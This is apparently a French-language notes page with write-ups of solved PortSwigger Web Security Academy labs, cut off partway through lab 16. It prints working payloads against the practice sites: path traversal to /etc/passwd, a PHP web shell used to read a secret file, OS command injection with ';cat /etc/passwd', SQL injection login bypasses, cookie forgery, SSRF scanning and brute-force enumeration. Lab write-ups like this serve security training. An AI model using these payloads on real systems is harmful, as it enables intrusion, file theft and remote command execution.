+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/challenges/low-logic/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Low Logic
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/challenges/opensecret/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OpenSecret
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/challenges/social-media-investigation-hub/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Social Media Investigation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/challenges/spookypass/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SpookyPass
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/challenges/the-puppet-master/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    The Puppet Master
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/challenges/webvault-time-machine/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WebVault Time Machine
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Security
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web Security
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PortSwigger Labs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../notes-perso/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Notes perso
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux et Systems
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Linux et Systems
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linux-luminarium/index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Luminarium
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CTF
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CTF
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ctf/index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Challenges
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<p><a href="../../README.md">🏠 Accueil du repo</a> </p>
+<h1 id="notes-portswigger-web-security-academy">Notes PortSwigger — Web Security Academy<a class="headerlink" href="#notes-portswigger-web-security-academy" title="Permanent link">&para;</a></h1>
+<p>Labs résolus de la Web Security Academy : access control, authentification, SSRF, upload, SQLi, XSS…</p>
+<h2 id="sommaire">Sommaire<a class="headerlink" href="#sommaire" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="#lab-1--path-traversal">Lab 1 — Path traversal</a></li>
+<li><a href="#lab-2--unprotected-admin-functionality">Lab 2 — Unprotected admin functionality</a></li>
+<li><a href="#lab-3--unprotected-admin-panel-with-unpredictable-url">Lab 3 — Unprotected admin panel with unpredictable URL</a></li>
+<li><a href="#lab-4--user-role-controlled-by-a-request-parameter">Lab 4 — User role controlled by a request parameter</a></li>
+<li><a href="#lab-5--user-id-controlled-by-request-parameter-with-unpredictable-user-ids">Lab 5 — User ID controlled by request parameter, with unpredictable user IDs</a></li>
+<li><a href="#lab-6--user-id-controlled-by-request-parameter-with-password-disclosure">Lab 6 — User ID controlled by request parameter with password disclosure</a></li>
+<li><a href="#lab-7--username-enumeration-via-different-responses">Lab 7 — Username enumeration via different responses</a></li>
+<li><a href="#lab-8--2fa-simple-bypass">Lab 8 — 2FA simple bypass</a></li>
+<li><a href="#lab-9--basic-ssrf-against-the-local-server">Lab 9 — Basic SSRF against the local server</a></li>
+<li><a href="#lab-10--basic-ssrf-against-another-back-end-system">Lab 10 — Basic SSRF against another back-end system</a></li>
+<li><a href="#lab-11--remote-code-execution-via-web-shell-upload">Lab 11 — Remote code execution via web shell upload</a></li>
+<li><a href="#lab-12--web-shell-upload-via-content-type-restriction-bypass">Lab 12 — Web shell upload via Content-Type restriction bypass</a></li>
+<li><a href="#lab-13--sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">Lab 13 — SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</a></li>
+<li><a href="#lab-14--os-command-injection-simple-case">Lab 14 — OS command injection, simple case</a></li>
+<li><a href="#lab-15--sql-injection-vulnerability-allowing-login-bypass">Lab 15 — SQL injection vulnerability allowing login bypass</a></li>
+<li><a href="#lab-16--reflected-xss-into-html-context-with-nothing-encoded">Lab 16 — Reflected XSS into HTML context with nothing encoded</a></li>
+<li><a href="#lab-17--sql-injection-attack-querying-the-database-type-and-version-on-oracle">Lab 17 — SQL injection attack, querying the database type and version on Oracle</a></li>
+<li><a href="#lab-18--basic-password-reset-poisoning">Lab 18 — Basic password reset poisoning</a></li>
+<li><a href="#lab-19--csrf-vulnerability-with-no-defenses">Lab 19 — CSRF vulnerability with no defenses</a></li>
+<li><a href="#lab-20--basic-clickjacking-with-csrf-token-protection">Lab 20 — Basic clickjacking with CSRF token protection</a></li>
+<li><a href="#lab-21--cors-vulnerability-with-basic-origin-reflection">Lab 21 — CORS vulnerability with basic origin reflection</a></li>
+<li><a href="#lab-22--stored-xss-into-html-context-with-nothing-encoded">Lab 22 — Stored XSS into HTML context with nothing encoded</a></li>
+<li><a href="#lab-23--dom-xss-in-documentwrite-sink-using-source-locationsearch">Lab 23 — DOM XSS in document.write sink using source location.search</a></li>
+<li><a href="#lab-24--dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-source">Lab 24 — DOM XSS in jQuery anchor href attribute sink using location.search source</a></li>
+<li><a href="#lab-25--dom-xss-in-jquery-selector-sink-using-a-hashchange-event">Lab 25 — DOM XSS in jQuery selector sink using a hashchange event</a></li>
+<li><a href="#lab-26--reflected-xss-into-attribute-with-angle-brackets-html-encoded">Lab 26 — Reflected XSS into attribute with angle brackets HTML-encoded</a></li>
+<li><a href="#lab-27--stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded">Lab 27 — Stored XSS into anchor href attribute with double quotes HTML-encoded</a></li>
+<li><a href="#lab-28--dom-xss-in-innerhtml-sink-using-source-locationsearch">Lab 28 — DOM XSS in innerHTML sink using source location.search</a></li>
+<li><a href="#lab-29--reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded">Lab 29 — Reflected XSS into a JavaScript string with angle brackets HTML encoded</a></li>
+</ul>
+<hr />
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-1-path-traversal">Lab 1 — Path traversal<a class="headerlink" href="#lab-1-path-traversal" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> Path Traversal</p>
+<p>This lab contains a path traversal vulnerability in the display of
+product images. To solve the lab, retrieve the contents of the
+<code>/etc/passwd</code> file.</p>
+<p><strong>Contexte :</strong></p>
+<p>Imagine a shopping application that displays images of items for sale.
+This might load an image using the following HTML:</p>
+<div class="highlight"><pre><span></span><code>&lt;img src="/loadImage?filename=218.png"&gt;
+</code></pre></div>
+<p>The image files are stored on disk in the location <code>/var/www/images/</code>.</p>
+<p><strong>Résolution :</strong></p>
+<p>En Burp Suite, on intercepte l’image, puis on modifie le code HTML de
+l’image. On peut le changer pour :</p>
+<div class="highlight"><pre><span></span><code>&lt;img src="../../../../../../../etc/passwd"&gt;
+</code></pre></div>
+<p>Le <code>../</code> permet de remonter de répertoire en répertoire jusqu’au
+répertoire racine où se trouve <code>/``etc``/``passwd</code>. On transmet ensuite
+la requête, et on obtient l’accès à toutes les informations sensibles
+contenues dans le fichier <code>/``etc``/``passwd</code>.</p>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-2-unprotected-admin-functionality">Lab 2 — Unprotected admin functionality<a class="headerlink" href="#lab-2-unprotected-admin-functionality" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> Access Control</p>
+<p>This lab has an unprotected admin panel. Solve the lab by deleting the
+user carlos.</p>
+<p><strong>Contexte :</strong></p>
+<p>For example, a website might host sensitive functionality at the
+following URL:</p>
+<div class="highlight"><pre><span></span><code>https://insecure-website.com/admin
+</code></pre></div>
+<p>In some cases, the administrative URL might be disclosed in other
+locations, such as the <code>robots.txt</code> file:</p>
+<div class="highlight"><pre><span></span><code>https://insecure-website.com/robots.txt
+</code></pre></div>
+<p><strong>Résolution :</strong></p>
+<p>Il y a deux façons de faire :</p>
+<ol>
+<li><strong>La plus simple</strong> : écrire <code>robots.txt</code> après l’URI complète dans
+    le navigateur.</li>
+<li><strong>La plus technique</strong> : utiliser une commande dans le terminal :</li>
+</ol>
+<!-- -->
+
+<div class="highlight"><pre><span></span><code>gobuster dir -u https://0a1200ef04844933828bfbab000100eb.web-security-academy.net/ -w /usr/share/wordlists/dirb/common.txt
+</code></pre></div>
+<p><img alt="Résultat gobuster" src="media/image1.png" /></p>
+<p>Résultat gobuster</p>
+<p>Cette commande trouve tous les endpoints accessibles après l’URL du
+site.</p>
+<p>Dans <code>robots.txt</code>, on trouve <code>/``administrator``-panel</code>. On accède
+ensuite à :</p>
+<div class="highlight"><pre><span></span><code>https://0a1200ef04844933828bfbab000100eb.web-security-academy.net/administrator-panel
+</code></pre></div>
+<p>Et on peut supprimer l’utilisateur carlos.</p>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-3-unprotected-admin-panel-with-unpredictable-url">Lab 3 — Unprotected admin panel with unpredictable URL<a class="headerlink" href="#lab-3-unprotected-admin-panel-with-unpredictable-url" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> Access Control</p>
+<p>This lab has an unprotected admin panel. It’s located at an
+unpredictable location, but the location is disclosed somewhere in the
+application. Solve the lab by accessing the admin panel and using it to
+delete the user carlos.</p>
+<p><strong>Contexte :</strong></p>
+<p>Imagine an application that hosts administrative functions at the
+following URL:</p>
+<div class="highlight"><pre><span></span><code>https://insecure-website.com/administrator-panel-yb556
+</code></pre></div>
+<p>This might not be directly guessable by an attacker. However, the
+application might still leak the URL to users — par exemple dans du
+JavaScript qui construit l’interface utilisateur en fonction du rôle de
+l’utilisateur.</p>
+<p><strong>Résolution :</strong></p>
+<p>On cherche le code source de la page ou la réponse de la page dans Burp
+Suite :</p>
+<p><img alt="Code source révélant l’URL admin" src="media/image2.png" /></p>
+<p>Code source révélant l’URL admin</p>
+<p>Puis on accède directement à :</p>
+<div class="highlight"><pre><span></span><code>https://0af900b403dbf3788137116100ae00fb.web-security-academy.net/admin-bfs2d3
+</code></pre></div>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-4-user-role-controlled-by-a-request-parameter">Lab 4 — User role controlled by a request parameter<a class="headerlink" href="#lab-4-user-role-controlled-by-a-request-parameter" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> Access Control</p>
+<p>This lab has an admin panel at <code>/admin</code>, which identifies administrators
+using a forgeable cookie. Solve the lab by accessing the admin panel and
+using it to delete the user carlos.</p>
+<p><strong>Identifiants :</strong> <code>wiener:peter</code></p>
+<p><strong>Contexte :</strong></p>
+<p>Some applications determine the user’s access rights or role at login
+and then store this information in a user-controllable location. This
+could be :</p>
+<ul>
+<li>A hidden field</li>
+<li>A cookie</li>
+<li>A preset query string parameter</li>
+</ul>
+<p><strong>Résolution :</strong></p>
+<p>Dans Burp Suite, on modifie le cookie <code>id=``wiener</code> en <code>admin=``true</code>.
+On obtient alors une réponse contenant deux liens :</p>
+<div class="highlight"><pre><span></span><code>&lt;a href="/admin/delete?username=carlos"&gt;
+&lt;a href="/admin/delete?username=wiener"&gt;
+</code></pre></div>
+<p>On prend l’URL de la page :</p>
+<div class="highlight"><pre><span></span><code>https://0ae200a4049f1e3380888a7f00e2000e.web-security-academy.net/admin
+</code></pre></div>
+<p>Et on ajoute le href pour supprimer carlos :</p>
+<div class="highlight"><pre><span></span><code>https://0ae200a4049f1e3380888a7f00e2000e.web-security-academy.net/admin/delete?username=carlos
+</code></pre></div>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-5-user-id-controlled-by-request-parameter-with-unpredictable-user-ids">Lab 5 — User ID controlled by request parameter, with unpredictable user IDs<a class="headerlink" href="#lab-5-user-id-controlled-by-request-parameter-with-unpredictable-user-ids" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> Access Control (IDOR)</p>
+<p>This lab has a horizontal privilege escalation vulnerability on the user
+account page but identifies users with GUIDs. To solve the lab, find the
+GUID for carlos, then submit his API key as the solution.</p>
+<p><strong>Identifiants :</strong> <code>wiener:peter</code></p>
+<p><strong>Contexte :</strong></p>
+<p>Horizontal privilege escalation is when a user accesses another user’s
+data at the same permission level. Par exemple, changer un paramètre
+d’URL comme <code>id=123</code> en <code>id=124</code> pour voir le compte de quelqu’un
+d’autre. C’est souvent dû à une vulnérabilité IDOR, où l’application ne
+vérifie pas correctement si l’utilisateur est autorisé à accéder à cette
+ressource. Même avec des IDs aléatoires (comme des GUIDs), c’est
+toujours exploitable si ces IDs sont exposés ailleurs.</p>
+<p><strong>Résolution :</strong></p>
+<p>On arrive sur le site et on cherche un blog posté par l’utilisateur
+carlos. On va dans Burp Suite et on récupère son id. Après connexion
+avec <code>wiener:peter</code>, on change simplement l’URL en ajoutant l’id de
+carlos. On obtient alors son API key.</p>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-6-user-id-controlled-by-request-parameter-with-password-disclosure">Lab 6 — User ID controlled by request parameter with password disclosure<a class="headerlink" href="#lab-6-user-id-controlled-by-request-parameter-with-password-disclosure" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> Access Control (IDOR)</p>
+<p>This lab has a user account page that contains the current user’s
+existing password, prefilled in a masked input. To solve the lab,
+retrieve the administrator’s password, then use it to delete the user
+carlos.</p>
+<p><strong>Identifiants :</strong> <code>wiener:peter</code></p>
+<p><strong>Résolution :</strong></p>
+<p>En se connectant avec ses identifiants, on voit dans l’URL un
+<code>id=``wiener</code>. On change cet id en <code>administrator</code> ou <code>carlos</code>. On peut
+ainsi voler le mot de passe de l’admin, se connecter avec son compte, et
+aller dans le panel admin pour supprimer carlos.</p>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-7-username-enumeration-via-different-responses">Lab 7 — Username enumeration via different responses<a class="headerlink" href="#lab-7-username-enumeration-via-different-responses" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> Authentication</p>
+<p>This lab is vulnerable to username enumeration and password brute-force
+attacks. It has an account with a predictable username and password,
+findable via des wordlists (candidate usernames / candidate passwords).
+To solve the lab, enumerate a valid username, brute-force this user’s
+password, then access their account page.</p>
+<p><strong>Résolution :</strong></p>
+<p>On se connecte avec des identifiants aléatoires comme <code>wiener:peter</code>,
+puis on va dans Burp Suite pour repérer la requête POST du formulaire de
+login. On envoie la requête à l’Intruder (<code>Ctrl+I</code>). Dans l’Intruder, on
+prend <code>wiener</code> et on ajoute <code>$</code> autour. On colle la liste de candidate
+usernames et on lance l’attaque.</p>
+<p>Une fois terminé, Burp trouve un seul username qui a une longueur de
+réponse différente des autres — signe que la réponse retournée est
+différente pour ce cas précis. On remplace ensuite <code>$``wiener``$</code> par le
+username correct (ex. alabama), puis on répète la même méthode pour
+trouver le mot de passe.</p>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-8-2fa-simple-bypass">Lab 8 — 2FA simple bypass<a class="headerlink" href="#lab-8-2fa-simple-bypass" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> Authentication</p>
+<p>This lab’s two-factor authentication can be bypassed. You have already
+obtained a valid username and password, but do not have access to the
+user’s 2FA verification code. To solve the lab, access Carlos’s account
+page.</p>
+<p><strong>Identifiants :</strong> <code>wiener:peter</code> — <strong>Victime :</strong> <code>carlos:montoya</code></p>
+<p><strong>Résolution :</strong></p>
+<p>On entre ses propres identifiants sur la page de login. Après
+validation, on change l’URL pour revenir à la page principale — en
+cliquant à nouveau sur “my account”, on peut sauter le code à 4 chiffres
+demandé, car le site pense qu’on est déjà connecté. On répète la même
+méthode pour carlos.</p>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-9-basic-ssrf-against-the-local-server">Lab 9 — Basic SSRF against the local server<a class="headerlink" href="#lab-9-basic-ssrf-against-the-local-server" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> SSRF</p>
+<p>This lab has a stock check feature which fetches data from an internal
+system. To solve the lab, change the stock check URL to access the admin
+interface at <code>http://localhost/admin</code> and delete the user carlos.</p>
+<p><strong>Résolution :</strong></p>
+<p>On consulte un article et son niveau de stock. Avec Burp Suite, on
+intercepte la requête POST de vérification de stock et on l’envoie au
+Repeater. On modifie la clé <code>stockApi</code> pour :</p>
+<div class="highlight"><pre><span></span><code>http://localhost/admin
+</code></pre></div>
+<p>La réponse révèle une ligne : <code>/admin/``delete?username``=``carlos</code>. Il
+suffit de remplacer à nouveau la clé stockApi par :</p>
+<div class="highlight"><pre><span></span><code>http://localhost/admin/delete?username=carlos
+</code></pre></div>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-10-basic-ssrf-against-another-back-end-system">Lab 10 — Basic SSRF against another back-end system<a class="headerlink" href="#lab-10-basic-ssrf-against-another-back-end-system" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> SSRF</p>
+<p>This lab has a stock check feature which fetches data from an internal
+system. To solve the lab, use the stock check functionality to scan the
+internal <code>192.168.0.X</code> range for an admin interface on port 8080, then
+use it to delete the user carlos.</p>
+<p><strong>Résolution :</strong></p>
+<p>On active Burp Suite, on consulte un objet aléatoire et son stock check.
+On envoie la requête POST du stock check à l’Intruder. L’objectif étant
+de scanner les IPs entre <code>192.168.0.1</code> et <code>192.168.0.255</code>, on surligne
+le dernier octet de l’IP et on ajoute <code>$</code> autour.</p>
+<p>On crée un script bash pour générer la liste des valeurs à tester :</p>
+<div class="highlight"><pre><span></span><code>for i in {2..254}; do echo $i &gt;&gt; numbers.txt; done
+</code></pre></div>
+<p>Ce script crée un fichier <code>numbers.txt</code> contenant les nombres de 1 à
+255.</p>
+<p>La stock API ressemble à :</p>
+<div class="highlight"><pre><span></span><code>stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fadmin
+</code></pre></div>
+<p>On lance l’Intruder avec <code>numbers.txt</code> en payload. Une seule requête
+retourne un code de statut 200 — c’est la seule qui renvoie
+effectivement quelque chose. Dans cet exemple, <code>192.168.0.135</code> est la
+bonne adresse IP stockApi. Dans le Repeater, la réponse donne :
+<code>/``delete?username``=``carlos</code>. On ajoute ça à la clé stockApi pour
+supprimer carlos.</p>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-11-remote-code-execution-via-web-shell-upload">Lab 11 — Remote code execution via web shell upload<a class="headerlink" href="#lab-11-remote-code-execution-via-web-shell-upload" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> File Upload / RCE</p>
+<p>This lab contains a vulnerable image upload function. It doesn’t perform
+any validation on the files users upload before storing them on the
+server’s filesystem. To solve the lab, upload a basic PHP web shell and
+use it to exfiltrate the contents of the file <code>/home/carlos/secret</code>.</p>
+<p><strong>Identifiants :</strong> <code>wiener:peter</code></p>
+<p><strong>Payloads utiles :</strong></p>
+<p>Lire un fichier arbitraire :</p>
+<div class="highlight"><pre><span></span><code>&lt;?php echo file_get_contents('/path/to/target/file'); ?&gt;
+</code></pre></div>
+<p>Web shell simple :</p>
+<div class="highlight"><pre><span></span><code>&lt;?php echo system($_GET['command']); ?&gt;
+</code></pre></div>
+<p><strong>Résolution :</strong></p>
+<p>On crée un fichier <code>shell.php</code> contenant le web shell simple ci-dessus.
+La requête web ressemble à :</p>
+<div class="highlight"><pre><span></span><code>http://whatever.com/files/images/shell.php?command=cat /home/carlos/secret
+</code></pre></div>
+<p>Sur le site, on peut parcourir un avatar — on choisit le fichier
+<code>shell.php</code> et on l’upload. Le site confirme que <code>/avatar/``shell.php</code> a
+été mis à jour, mais accéder directement à cet endpoint renvoie “not
+found”.</p>
+<p><img alt="Fichier uploadé non trouvé au premier endpoint" src="media/image3.png" /></p>
+<p>Fichier uploadé non trouvé au premier endpoint</p>
+<p>En copiant le lien de l’image, on trouve le bon endpoint :
+<code>/files/avatar/``shell.php</code>. On ajoute alors la commande directement
+dans l’URL :</p>
+<div class="highlight"><pre><span></span><code>https://0a5a00e304ac8ace81cfedff00430054.web-security-academy.net/files/avatars/shell.php?command=cat%20/home/carlos/secret
+</code></pre></div>
+<p>⚠️ <strong>Attention :</strong> l’echo est fait deux fois, donc il faut ne soumettre
+qu’un seul segment comme solution valide.</p>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-12-web-shell-upload-via-content-type-restriction-bypass">Lab 12 — Web shell upload via Content-Type restriction bypass<a class="headerlink" href="#lab-12-web-shell-upload-via-content-type-restriction-bypass" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> File Upload / RCE</p>
+<p>This lab contains a vulnerable image upload function. It attempts to
+prevent users from uploading unexpected file types but relies on
+checking user-controllable input to verify this. To solve the lab,
+upload a basic PHP web shell and use it to exfiltrate the contents of
+the file <code>/home/carlos/secret</code>.</p>
+<p><strong>Identifiants :</strong> <code>wiener:peter</code></p>
+<p><strong>Résolution :</strong></p>
+<p>Avec le même <code>shell.php</code> :</p>
+<div class="highlight"><pre><span></span><code>&lt;?php echo system($_GET['command']); ?&gt;
+</code></pre></div>
+<p>On se connecte avec <code>wiener:peter</code> :</p>
+<p><img alt="Page de compte après connexion" src="media/image4.png" /></p>
+<p>Page de compte après connexion</p>
+<p>En essayant d’uploader <code>shell.php</code> directement, le site refuse :</p>
+<blockquote>
+<p>Sorry, file type application/x-php is not allowed. Only image/jpeg and
+image/png are allowed. Sorry, there was an error uploading your file.</p>
+</blockquote>
+<p>Dans Burp Suite, on renvoie la requête au Repeater (<code>Ctrl+R</code>) :</p>
+<p><img alt="Requête envoyée au Repeater" src="media/image5.png" /></p>
+<p>Requête envoyée au Repeater</p>
+<p>On change le <code>Content-Type</code> en <code>image/jpeg</code> et on renvoie :</p>
+<p><img alt="Modification du Content-Type" src="media/image6.png" /></p>
+<p>Modification du Content-Type</p>
+<p><img alt="Fichier accepté après modification" src="media/image3.png" /></p>
+<p>Fichier accepté après modification</p>
+<p>Une fois envoyé, on copie le lien de l’image :</p>
+<p><img alt="Lien de l’image uploadée" src="media/image7.png" /></p>
+<p>Lien de l’image uploadée</p>
+<p>Dans ce lien, on ajoute :</p>
+<div class="highlight"><pre><span></span><code>?command=ls /home/carlos/
+?command=cat /home/carlos/secret
+</code></pre></div>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-13-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">Lab 13 — SQL injection vulnerability in WHERE clause allowing retrieval of hidden data<a class="headerlink" href="#lab-13-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> SQL Injection</p>
+<p>This lab contains a SQL injection vulnerability in the product category
+filter. When the user selects a category, the application carries out a
+SQL query like the following :</p>
+<div class="highlight"><pre><span></span><code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+</code></pre></div>
+<p>To solve the lab, perform a SQL injection attack that causes the
+application to display one or more unreleased products.</p>
+<p><strong>Résolution :</strong></p>
+<p>On affine la recherche avec une des catégories proposées par le site. On
+teste d’abord avec un <code>'</code> en fin d’URL pour vérifier si le site est
+vulnérable aux injections SQL.</p>
+<p>Si le site est vulnérable, on ajoute en fin d’URL :</p>
+<div class="highlight"><pre><span></span><code>' or 1=1---
+</code></pre></div>
+<p>Exemple :</p>
+<div class="highlight"><pre><span></span><code>https://0a3b006e047c98d78092f87b0080000a.web-security-academy.net/filter?category=Lifestyle' or 1=1---
+</code></pre></div>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-14-os-command-injection-simple-case">Lab 14 — OS command injection, simple case<a class="headerlink" href="#lab-14-os-command-injection-simple-case" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> OS Command Injection</p>
+<p>This lab contains an OS command injection vulnerability in the product
+stock checker. The application executes a shell command containing
+user-supplied products and store IDs and returns the raw output from the
+command in its response. To solve the lab, execute the <code>whoami</code> command
+to determine the name of the current user.</p>
+<p><strong>Résolution :</strong></p>
+<p>Avec Burp Suite, on vérifie le stock d’un produit aléatoire, on récupère
+la requête POST et on l’envoie au Repeater.</p>
+<p>Avant :</p>
+<div class="highlight"><pre><span></span><code>productId=18&amp;storeId=2
+</code></pre></div>
+<p>Après :</p>
+<div class="highlight"><pre><span></span><code>productId=18&amp;storeId=2;cat /etc/passwd
+</code></pre></div>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-15-sql-injection-vulnerability-allowing-login-bypass">Lab 15 — SQL injection vulnerability allowing login bypass<a class="headerlink" href="#lab-15-sql-injection-vulnerability-allowing-login-bypass" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> SQL Injection</p>
+<p>This lab contains a SQL injection vulnerability in the login function.
+To solve the lab, perform a SQL injection attack that logs in to the
+application as the administrator user.</p>
+<p><strong>Résolution :</strong></p>
+<p>Lab facile — il suffit de se connecter avec :</p>
+<div class="highlight"><pre><span></span><code>Username : administrator'--
+Password : (n'importe quoi)
+</code></pre></div>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-16-reflected-xss-into-html-context-with-nothing-encoded">Lab 16 — Reflected XSS into HTML context with nothing encoded<a class="headerlink" href="#lab-16-reflected-xss-into-html-context-with-nothing-encoded" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> Cross-Site Scripting (XSS)</p>
+<p>This lab contains a simple reflected cross-site scripting vulnerability
+in the search functionality. To solve the lab, perform a cross-site
+scripting attack that calls the <code>alert</code> function.</p>
+<p><strong>Résolution :</strong></p>
+<p>Le paramètre de recherche est réinjecté tel quel dans le HTML de la
